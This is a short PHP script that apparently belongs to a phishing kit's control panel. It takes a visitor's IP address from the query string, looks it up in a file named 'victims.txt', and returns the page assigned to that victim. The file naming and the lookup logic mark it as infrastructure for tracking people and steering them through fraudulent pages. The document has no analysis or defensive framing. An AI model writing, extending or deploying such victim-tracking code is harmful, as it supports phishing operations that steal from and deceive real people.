<?php
if (!isset($_GET['ip'])) {
    echo "IP missing";
    exit;
}

$ip = $_GET['ip'];
$victimsFile = "../victims/victims.txt";

if (!file_exists($victimsFile)) {
    echo "No data";
    exit;
}

$lines = file($victimsFile, FILE_IGNORE_NEW_LINES);
foreach ($lines as $line) {
    if (strpos($line, $ip . ' => ') === 0) {
        $page = explode(' => ', $line)[1];
        echo $page;
        exit;
    }
}

echo "Unknown";
?>